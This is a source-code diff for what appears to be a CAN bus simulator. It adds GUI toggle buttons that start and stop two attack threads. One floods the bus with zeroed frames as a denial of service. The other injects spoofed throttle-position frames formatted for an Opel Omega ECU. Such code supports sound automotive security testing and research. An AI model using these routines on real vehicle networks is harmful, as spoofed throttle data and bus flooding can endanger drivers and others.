@@ -23,8 +23,9 @@
 // TODO - Replace sleep by pthread_cond_wait
 
 pthread_mutex_t write_mut;
-pthread_mutex_t m;
-pthread_cond_t c;
+pthread_mutex_t m, dos_mut, flood_mut;
+pthread_cond_t c, dos_cond, flood_cond;
+bool dosOn = false, floodOn = false;
 static float acc_pedal = 0;
 
 typedef enum
@@ -34,94 +35,79 @@ typedef enum
     OutOfRange
 } tps_attack_mode;
 
-// Callback function for the switch state change
-void switch_state_changed(GtkSwitch *widget, gboolean state, gpointer data)
+static void dos_bttn_cllbck(GtkWidget *widget, gpointer data)
 {
-    GtkLabel *label = GTK_LABEL(data);
-
-    if (state)
+    pthread_mutex_lock(&dos_mut);
+    dosOn = !dosOn;
+    if (dosOn)
     {
-        gtk_label_set_text(label, "DOS Attack ON");
+        pthread_cond_signal(&dos_cond);
+        printf("DOS is On\n");
     }
     else
     {
-        gtk_label_set_text(label, "DOS Attack OFF");
+        printf("DOS is Off\n");
     }
+    pthread_mutex_unlock(&dos_mut);
 }
 
-// Callback function for the switch state change
-void switch2_state_changed(GtkSwitch *widget, gboolean state, gpointer data)
+static void flood_bttn_cllbck(GtkWidget *widget, gpointer data)
 {
-    GtkLabel *label = GTK_LABEL(data);
-
-    if (state)
+    pthread_mutex_lock(&flood_mut);
+    floodOn = !floodOn;
+    if (floodOn)
     {
-        gtk_label_set_text(label, "Flooding Attack ON");
+        pthread_cond_signal(&flood_cond);
+        printf("Flooding is On\n");
     }
     else
     {
-        gtk_label_set_text(label, "Flooding Attack OFF");
+        printf("Flooding is Off\n");
     }
+    pthread_mutex_unlock(&flood_mut);
 }
 
-// Callback function for exit button
-void exit_button_clicked(GtkWidget *widget, gpointer data)
-{
-    GApplication *app = G_APPLICATION(data);
-    g_application_quit(app);
-}
-
-// Callback function to activate the application
-void activate(GtkApplication *app, gpointer user_data)
+static void activate(GtkApplication *app, gpointer user_data)
 {
     GtkWidget *window;
     GtkWidget *grid;
-    GtkWidget *toggle_switch, *toggle_switch2;
-    GtkWidget *exit_button;
-    GtkWidget *label, *label2;
+    GtkWidget *button;
 
-    // Create a new window
+    /* create a new window, and set its title */
     window = gtk_application_window_new(app);
-    gtk_window_set_title(GTK_WINDOW(window), "CAN Simulator");
-    gtk_window_set_default_size(GTK_WINDOW(window), 300, 300);
+    gtk_window_set_title(GTK_WINDOW(window), "Window");
 
-    // Create a grid layout
+    /* Here we construct the container that is going pack our buttons */
     grid = gtk_grid_new();
+
+    /* Pack the container in the window */
     gtk_window_set_child(GTK_WINDOW(window), grid);
 
-    // Create a label
-    label = gtk_label_new("DOS Attack Switch");
-    gtk_grid_attach(GTK_GRID(grid), label, 0, 0, 1, 1);
+    button = gtk_toggle_button_new_with_label("DOS");
+    g_signal_connect(button, "clicked", G_CALLBACK(dos_bttn_cllbck), NULL);
 
-    // Create a switch
-    toggle_switch = gtk_switch_new();
-    gtk_grid_attach(GTK_GRID(grid), toggle_switch, 0, 1, 1, 1);
+    /* Place the first button in the grid cell (0, 0), and make it fill
+     * just 1 cell horizontally and vertically (ie no spanning)
+     */
+    gtk_grid_attach(GTK_GRID(grid), button, 0, 0, 1, 1);
 
-    // Connect the switch state change event to the callback function
-    g_signal_connect(toggle_switch, "state-set", G_CALLBACK(switch_state_changed), label);
+    button = gtk_toggle_button_new_with_label("Flood");
+    g_signal_connect(button, "clicked", G_CALLBACK(flood_bttn_cllbck), NULL);
 
-    // Create a 2nd label
-    label2 = gtk_label_new("Flooding Attack Switch");
-    gtk_grid_attach(GTK_GRID(grid), label, 3, 3, 1, 1);
+    /* Place the second button in the grid cell (1, 0), and make it fill
+     * just 1 cell horizontally and vertically (ie no spanning)
+     */
+    gtk_grid_attach(GTK_GRID(grid), button, 1, 0, 1, 1);
 
-    // Create a switch
-    /*
-    toggle_switch2 = gtk_switch_new();
-    gtk_grid_attach(GTK_GRID(grid), toggle_switch2, 1, 1, 1, 1);
-    */
+    button = gtk_button_new_with_label("Quit");
+    g_signal_connect_swapped(button, "clicked", G_CALLBACK(gtk_window_destroy), window);
 
-    // Connect the switch state change event to the callback function
-    //g_signal_connect(toggle_switch2, "state-set", G_CALLBACK(switch2_state_changed), label2);
+    /* Place the Quit button in the grid cell (0, 1), and make it
+     * span 2 columns.
+     */
+    gtk_grid_attach(GTK_GRID(grid), button, 0, 1, 2, 1);
 
-    // Create an exit button
-    /*
-    exit_button = gtk_button_new_with_label("Exit");
-    g_signal_connect(exit_button, "clicked", G_CALLBACK(exit_button_clicked), app);
-    gtk_grid_attach(GTK_GRID(grid), exit_button, 3, 0, 1, 1);
-    */
-
-    // Show all widgets in the window
-    gtk_widget_show(window);
+    gtk_window_present(GTK_WINDOW(window));
 }
 
 TCAN_HANDLE can_init()
@@ -485,85 +471,104 @@ void *esp_data2_send_routine(void *args)
 // TODO : Find error on this
 void *fake_ecu2_node(void *args)
 {
-    TCAN_HANDLE handle = *(TCAN_HANDLE *)args;
-    CAN_MSG msg;
-
-    msg.Flags = CAN_FLAGS_STANDARD;
-    msg.Id = 0x1c0;
-    msg.Size = 8;
-    double pos = 0;
-    if (ATTACK_FAKE_TPS_MODE == Fast)
-    {
-        pos = 100;
-    }
-    else if (ATTACK_FAKE_TPS_MODE == Slow)
-    {
-        pos = 0;
-    }
-    else
-    {
-        pos = 2000;
-    }
-
-    TCAN_STATUS status;
-    struct timespec ts;
-
-    struct opel_omega_2001_ecu_data2_t msg_p;
-
-    opel_omega_2001_ecu_data2_init(&msg_p);
-    msg_p.tps = opel_omega_2001_ecu_data2_tps_encode(pos);
-    opel_omega_2001_ecu_data2_pack(msg.Data, &msg_p, 8);
-
     while (1)
     {
-        pthread_mutex_lock(&write_mut);
-        status = CAN_Write(handle, &msg);
-        pthread_mutex_unlock(&write_mut);
-        if (status != CAN_ERR_OK)
-            printf("error sending CAN frame \n");
+        pthread_mutex_lock(&flood_mut);
+        pthread_cond_wait(&flood_cond, &flood_mut);
+        pthread_mutex_unlock(&flood_mut);
+        TCAN_HANDLE handle = *(TCAN_HANDLE *)args;
+        CAN_MSG msg;
 
-        timespec_get(&ts, TIME_UTC);
-        ts.tv_sec += (int)ATTACK_FAKE_TPS_FREQUENCY;
-        ts.tv_nsec += (ATTACK_FAKE_TPS_FREQUENCY - (int)ATTACK_FAKE_TPS_FREQUENCY) * 10000000000;
-        pthread_mutex_lock(&m);
-        pthread_cond_timedwait(&c, &m, &ts);
-        pthread_mutex_unlock(&m);
+        msg.Flags = CAN_FLAGS_STANDARD;
+        msg.Id = 0x1c0;
+        msg.Size = 8;
+        double pos = 0;
+        if (ATTACK_FAKE_TPS_MODE == Fast)
+        {
+            pos = 100;
+        }
+        else if (ATTACK_FAKE_TPS_MODE == Slow)
+        {
+            pos = 0;
+        }
+        else
+        {
+            pos = 2000;
+        }
+
+        TCAN_STATUS status;
+        struct timespec ts;
+
+        struct opel_omega_2001_ecu_data2_t msg_p;
+
+        opel_omega_2001_ecu_data2_init(&msg_p);
+        msg_p.tps = opel_omega_2001_ecu_data2_tps_encode(pos);
+        opel_omega_2001_ecu_data2_pack(msg.Data, &msg_p, 8);
+
+        pthread_mutex_lock(&flood_mut);
+        while (floodOn)
+        {
+            pthread_mutex_unlock(&flood_mut);
+            pthread_mutex_lock(&write_mut);
+            status = CAN_Write(handle, &msg);
+            pthread_mutex_unlock(&write_mut);
+            if (status != CAN_ERR_OK)
+                printf("error sending CAN frame \n");
+
+            timespec_get(&ts, TIME_UTC);
+            ts.tv_sec += (int)ATTACK_FAKE_TPS_FREQUENCY;
+            ts.tv_nsec += (ATTACK_FAKE_TPS_FREQUENCY - (int)ATTACK_FAKE_TPS_FREQUENCY) * 10000000000;
+            pthread_mutex_lock(&m);
+            pthread_cond_timedwait(&c, &m, &ts);
+            pthread_mutex_unlock(&m);
+            pthread_mutex_lock(&flood_mut);
+        }
+        pthread_mutex_unlock(&flood_mut);
     }
-
     return NULL;
 }
 
 void *dos_attack_node(void *args)
 {
-    TCAN_HANDLE handle = *(TCAN_HANDLE *)args;
-    CAN_MSG msg;
-
-    msg.Flags = CAN_FLAGS_STANDARD;
-    msg.Id = ATTACK_DOS_ID;
-    msg.Size = 8;
-    for (int i = 0; i < 8; i++)
-    {
-        msg.Data[i] = 0;
-    }
-
-    struct timespec ts;
-    TCAN_STATUS status;
-
     while (1)
     {
-        pthread_mutex_lock(&write_mut);
-        status = CAN_Write(handle, &msg);
-        pthread_mutex_unlock(&write_mut);
-        if (status != CAN_ERR_OK)
-            printf("error sending CAN frame \n");
-        timespec_get(&ts, TIME_UTC);
-        ts.tv_sec += (int)ATTACK_DOS_FREQUENCY;
-        ts.tv_nsec += (ATTACK_DOS_FREQUENCY - (int)ATTACK_DOS_FREQUENCY) * 10000000000;
-        pthread_mutex_lock(&m);
-        pthread_cond_timedwait(&c, &m, &ts);
-        pthread_mutex_unlock(&m);
-    }
+        pthread_mutex_lock(&dos_mut);
+        pthread_cond_wait(&dos_cond, &dos_mut);
+        pthread_mutex_unlock(&dos_mut);
 
+        TCAN_HANDLE handle = *(TCAN_HANDLE *)args;
+        CAN_MSG msg;
+
+        msg.Flags = CAN_FLAGS_STANDARD;
+        msg.Id = ATTACK_DOS_ID;
+        msg.Size = 8;
+        for (int i = 0; i < 8; i++)
+        {
+            msg.Data[i] = 0;
+        }
+
+        struct timespec ts;
+        TCAN_STATUS status;
+
+        pthread_mutex_lock(&dos_mut);
+        while (dosOn)
+        {
+            pthread_mutex_unlock(&dos_mut);
+            pthread_mutex_lock(&write_mut);
+            status = CAN_Write(handle, &msg);
+            pthread_mutex_unlock(&write_mut);
+            if (status != CAN_ERR_OK)
+                printf("error sending CAN frame \n");
+            timespec_get(&ts, TIME_UTC);
+            ts.tv_sec += (int)ATTACK_DOS_FREQUENCY;
+            ts.tv_nsec += (ATTACK_DOS_FREQUENCY - (int)ATTACK_DOS_FREQUENCY) * 10000000000;
+            pthread_mutex_lock(&m);
+            pthread_cond_timedwait(&c, &m, &ts);
+            pthread_mutex_unlock(&m);
+            pthread_mutex_lock(&dos_mut);
+        }
+        pthread_mutex_unlock(&dos_mut);
+    }
     return NULL;
 }
 
@@ -572,8 +577,7 @@ int main(int argc, char *argv[])
     GtkApplication *app;
     int gui_status;
 
-    // Create a new application
-    app = gtk_application_new("com.example.GtkApp", G_APPLICATION_FLAGS_NONE);
+    app = gtk_application_new("org.gtk.example", G_APPLICATION_FLAGS_NONE);
     g_signal_connect(app, "activate", G_CALLBACK(activate), NULL);
 
     TCAN_HANDLE handle = can_init();
@@ -623,16 +627,12 @@ int main(int argc, char *argv[])
     pthread_t esp_data2_thread;
     pthread_create(&esp_data2_thread, NULL, esp_data2_send_routine, &handle);
 
-#ifdef ATTACK_FAKE_TPS_NODE
     pthread_t attack_tps_thread;
     pthread_create(&attack_tps_thread, NULL, fake_ecu2_node, &handle);
-#endif
-#ifdef ATTACK_DOS_NODE
+
     pthread_t attack_dos_thread;
     pthread_create(&attack_dos_thread, NULL, dos_attack_node, &handle);
-#endif
 
-    // Run the application
     gui_status = g_application_run(G_APPLICATION(app), argc, argv);
 
     pthread_join(ecu_data1_thread, NULL);
